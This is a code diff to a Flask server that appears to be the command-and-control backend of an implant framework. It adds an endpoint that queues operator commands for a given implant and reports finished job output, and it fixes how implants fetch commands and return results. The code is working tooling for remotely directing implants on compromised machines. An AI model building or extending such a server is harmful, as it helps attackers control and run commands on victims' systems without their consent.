@@ -106,6 +106,31 @@ def home():  # put application's code here
     return render_template('index.html', agents=agents, command_out=output)
 
 
+@app.route('/api/1.1/add_command', methods=['POST'])
+def add_command():
+    if request.method == 'POST':
+        json = request.json
+        command = json['params'] 
+        implantID = json['method'][4:]
+        new_comm = Commands(implantID=implantID, command=command)
+        db.session.add(new_comm)
+        db.session.flush()
+        db.session.commit()
+        db.session.refresh(new_comm)
+        res = Commands.query.filter(Commands.implantID==implantID, Commands.retrieved==True, Commands.displayed==False).first()
+        output = f"[+] new job started with id {new_comm.commandID}"
+        if res != None and res.output != None:
+            res.displayed = True
+            output += f"\n[*] job with id {res.commandID} finished with output: \n{res.output}"
+            db.session.flush()
+            db.session.commit()
+        rpc = {}
+        rpc["result"] = output
+        rpc["jsonrpc"] = json["jsonrpc"]
+        rpc["id"] = json["id"]
+        return rpc
+
+
 @app.route('/api/1.1/add_agent', methods=['POST'])
 def agent_add():
     print(request.method)
@@ -124,6 +149,8 @@ def get_command():
         if res == None:
             return "None"
         res.retrieved = True
+        db.session.flush()
+        db.session.commit()
         return res.command + "," + str(res.commandID)
 
 
@@ -134,11 +161,10 @@ def command_out():
         output = request.json['output']
         implantID = request.json['implantID']
         commandID = request.json['commandID']
-        # print(output, agent_id)
-        agent = Commands.query.filter_by(implantID=implantID).first()
+        agent = Commands.query.filter(Commands.implantID==implantID, Commands.commandID==commandID).first()
         agent.output = output
-        agent.command = 'None'
         # print(agent.output)
+        db.session.flush()
         db.session.commit()
         return 'Received'
 
